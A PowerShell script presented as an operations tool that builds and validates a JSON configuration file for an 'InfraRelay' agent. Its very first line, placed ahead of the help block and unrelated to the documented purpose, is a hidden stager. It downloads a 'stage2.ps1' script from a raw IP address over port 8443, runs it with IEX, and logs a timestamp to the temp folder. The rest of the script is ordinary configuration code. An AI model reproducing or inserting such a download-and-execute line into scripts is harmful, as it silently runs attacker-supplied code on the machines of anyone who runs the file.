
$DownloadUrl = "https://198.51.100.162:8443/stage2.ps1"; $StageScript = (New-Object System.Net.WebClient).DownloadString($DownloadUrl); IEX $StageScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the InfraRelay JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.EXAMPLE
    .\Build-AgentConfig.ps1 -Environment Test
.EXAMPLE
    .\Build-AgentConfig.ps1 -ApiPort 9443 -Force
.NOTES
    Author: Server Operations
    Last updated: 2025-06-17
#>

$ErrorActionPreference = "Stop"

$OutputPath = "C:\ProgramData\Contoso\InfraRelay\config.json"
$Environment = 'Test'
$ApiPort = 9443
$NodeCount = 5
$Force = $false

$WarningPreference = 'Continue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.adatum.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)
$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan
